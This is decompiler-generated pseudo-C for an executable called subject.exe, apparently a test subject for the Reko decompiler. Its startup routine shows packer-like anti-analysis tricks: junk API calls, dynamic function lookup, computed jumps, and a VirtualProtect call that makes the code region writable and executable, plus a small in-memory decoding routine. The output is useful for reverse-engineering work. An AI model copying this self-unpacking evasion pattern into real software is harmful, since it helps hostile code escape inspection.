// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401026: void fn00401026(Register (ptr word32) edx, Register word32 edi, Stack word32 dwArg00)
void fn00401026(word32 * edx, word32 edi, word32 dwArg00)
{
	*edx = (word32) ((byte) C + (*edx + 3455551474));
}

// 0040F143: Register Eq_15 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	GetCommandLineA();
	GetCurrentProcessId();
	Eq_22 eax_13 = GetModuleHandleA(&globals->t434FC7);
	GetCommandLineW();
	GetVersion();
	GetCommandLineA();
	SizeofResource(0x00, dwLoc14);
	GetACP();
	Eq_46 eax_35 = GetProcAddress(eax_13, &globals->t434FD1);
	GetACP();
	SizeofResource(0x00, eax_13);
	GetCommandLineW();
	GetACP();
	Eq_62 eax_55 = eax_35();
	SizeofResource(0x00, eax_13);
	<anonymous> * eax_68 = (eax_55 ^ 0xC0000005) + 0x0040F1F9;
	ptr32 esp_70;
	word32 ebp_71;
	byte SCZO_72;
	word32 eax_73;
	byte SZO_74;
	byte C_75;
	eax_68();
	*(esp_70 - 0x04) = fp - 0x24;
	*(esp_70 - 0x08) = 0x40;
	*(esp_70 - 0x0C) = 56884;
	*(esp_70 - 0x10) = 0x00401000;
	GetCommandLineW();
	VirtualProtect(*(esp_70 - 0x10), *(esp_70 - 0x0C), *(esp_70 - 0x08), *(esp_70 - 0x04));
	*(esp_70 - 0x04) = (union Eq_62 *) eax_55;
	GetCommandLineA();
	*(esp_70 - 0x08) = 56884;
	GetVersion();
	*(esp_70 - 0x0C) = 0x00401000;
	word32 esp_103;
	word32 ebp_104;
	byte SCZO_105;
	word32 eax_106;
	byte SZO_107;
	byte C_108;
	(eax_55 - ~0x4040F104)();
}

